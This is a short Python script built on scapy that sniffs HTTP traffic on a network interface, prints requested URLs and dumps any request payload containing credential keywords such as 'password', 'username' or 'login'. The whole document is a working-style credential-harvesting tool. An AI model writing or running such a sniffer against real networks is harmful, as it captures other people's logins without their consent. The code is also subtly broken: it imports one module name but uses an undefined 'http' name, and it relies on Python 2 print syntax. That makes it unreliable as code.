#!/usr/bin/python
# needed to pip install scapy_http
# sniffs HTTP traffic data for any of the words in the words list

import scapy.all as scapy
from scapy_http import scapy_http


def sniff(interface):
    scapy.sniff(iface=interface, store=False,  prn=process_packets)


def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print url
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                    print load
                    break
                

words = ["password", "user", "username", "Password", "login"]
sniff("eth0")